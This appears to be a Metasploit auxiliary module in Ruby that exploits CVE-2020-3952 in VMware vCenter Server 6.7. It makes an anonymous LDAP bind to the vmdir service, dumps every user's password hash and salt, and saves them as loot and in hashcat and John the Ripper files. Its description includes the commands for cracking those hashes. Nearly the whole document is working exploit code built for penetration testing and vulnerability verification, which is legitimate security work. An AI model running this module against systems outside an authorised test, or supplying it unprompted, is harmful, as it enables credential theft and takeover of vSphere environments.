##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary

  include Msf::Exploit::Remote::LDAP
  include Msf::Auxiliary::Report

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'VMware vCenter Server vmdir Password Hash Retrieval',
        'Description' => %q{
          This module uses an anonymous-bind LDAP connection to dump password
          hashes from the vmdir service in VMware vCenter Server version 6.7
          prior to the 6.7U3f update.
          For password cracking use:
             hashcat -a 3 -m 1710 --user OUTPUT_HASHCAT_FILE
             john -format='dynamic=sha512($p.$s)' OUTPUT_JOHN_FILE
        },
        'Author' => [
          'Hynek Petrak', # Discovered by, module
          'wvu', # Based on Module by
        ],
        'References' => [
          ['CVE', '2020-3952'],
          ['URL', 'https://www.vmware.com/security/advisories/VMSA-2020-0006.html']
        ],
        'DisclosureDate' => '2020-04-09', # Vendor advisory
        'License' => MSF_LICENSE,
        'Actions' => [
          ['Dump', 'Description' => 'Dump user password hashes']
        ],
        'DefaultAction' => 'Dump',
        'Notes' => {
          'Stability' => [CRASH_SAFE],
          'SideEffects' => [IOC_IN_LOGS]
        }
      )
    )

    register_options([
      OptString.new('BASE_DN', [false, 'LDAP base DN if you already have it']),
      OptString.new('OUTPUT_HASHCAT_FILE', [false, "Save captured password hashes in hashcat format"]),
      OptString.new('OUTPUT_JOHN_FILE', [false, "Save captured password hashes in john the ripper format"])
    ])

    register_advanced_options([
      OptFloat.new('ConnectTimeout', [false, 'Timeout for LDAP connect', 10.0])
    ])
  end

  def base_dn
    @base_dn ||= 'dc=vsphere,dc=local'
  end

  def policy_dn
    "cn=password and lockout policy,#{base_dn}"
  end

  # Retrieve root DSE with base DN:
  #   ldapsearch -xb "" -s base -H ldap://[redacted]
  #
  # Dump data using discovered base DN:
  #   ldapsearch -xb dc=vsphere,dc=local -H ldap://[redacted] -
  def run
    opts = {
      host: rhost,
      port: rport,
      connect_timeout: datastore['ConnectTimeout']
    }

    entries = nil

    Net::LDAP.open(opts) do |ldap|
      if (@base_dn = datastore['BASE_DN'])
        print_status("User-specified base DN: #{base_dn}")
      else
        print_status('Discovering base DN automatically')

        unless (@base_dn = discover_base_dn(ldap))
          print_warning('Falling back on default base DN dc=vsphere,dc=local')
        end
      end

      print_status("Dumping LDAP passwords from vmdir service at #{peer}")
      attrs = ["-", "userPassword"]
      filter = "(userPassword = *)"
      entries = ldap.search(base: base_dn, filter: filter, attributes: attrs)
    end

    # Look for an entry with a non-empty vmwSTSPrivateKey attribute
    unless entries&.find { |entry| entry[:userpassword].any? }
      print_error("#{peer} no password dumped")
      return Exploit::CheckCode::Safe
    end

    pillage(entries)

    # HACK: Stash discovered base DN in CheckCode reason
    Exploit::CheckCode::Vulnerable(base_dn)
  rescue Net::LDAP::Error => e
    print_error("#{e.class}: #{e.message}")
    Exploit::CheckCode::Unknown
  end

  def pillage(entries)
    
    entries.each do |entry|
      dn = entry.dn
      print_line(dn)
      userpass = entry.userpassword.first.to_s
      type = userpass[0].ord
      
      # https://github.com/vmware/lightwave/blob/d50d41edd1d9cb59e7b7cc1ad284b9e46bfa703d/lwraft/server/middle-layer/password.c#L36
      unless type == 1
        print_error("#{peer} FIXME: hash type #{type} not yet supported")
        next
      end

      hexhash = userpass.unpack("H*").first
      hash = hexhash[2, 128]
      salt = hexhash[2+128, 32]
      print_good("#{peer} #{dn}:#{hash}:#{salt}")
      write_output_files(rhost, dn, hash, salt)
    end
    
    ldif = entries.map(&:to_ldif).join("\n")

    print_status('Storing LDAP data in loot')

    ldif_filename = store_loot(
      name, # ltype
      'text/plain', # ctype
      rhost, # host
      ldif, # data
      nil, # filename
      "Base DN: #{base_dn}" # info
    )

    unless ldif_filename
      print_error('Could not store LDAP data in loot')
      return
    end
    
    print_good("Saved LDAP data to #{ldif_filename}")

  end
  
  def write_output_files(rhost, username, hash, salt)
    # -m 1710
    if datastore['OUTPUT_HASHCAT_FILE']
      ::File.open(datastore['OUTPUT_HASHCAT_FILE'], "ab") do |fd|
        fd.write("#{rhost} #{username}:#{hash}:#{salt}\n")
        fd.flush
      end
    end
    
    # -format='dynamic=sha512($p.$s)'
    if datastore['OUTPUT_JOHN_FILE']
      ::File.open(datastore['OUTPUT_JOHN_FILE'], "ab") do |fd|
        fd.write("#{rhost} #{username}:#{hash}$HEX$#{salt}\n")
        fd.flush
      end
    end
  end

end
